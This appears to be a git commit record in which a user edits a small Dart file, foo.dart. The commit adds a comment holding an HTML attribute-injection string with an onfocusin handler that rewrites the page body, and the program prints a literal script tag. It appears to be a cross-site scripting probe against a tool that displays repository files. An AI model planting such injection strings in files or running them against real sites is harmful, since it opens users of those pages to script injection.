b39219127db2795fd2df9a591275bd830928c797
namelost2 <144593173+namelost2@users.noreply.github.com>
2025-01-06 17:55:43 +0100

    Update foo.dart

--- foo.dart
+++ foo.dart
@@ -1,5 +1,9 @@
 import 'dart:io';
 
+/*
+class=\"instapaper_body ' id=x tabindex=1 onfocusin='document.body.innerHTML="hello lol"' " data-path="
+*/
+
 void main() {
   print("<script>hello world</script>");
 }
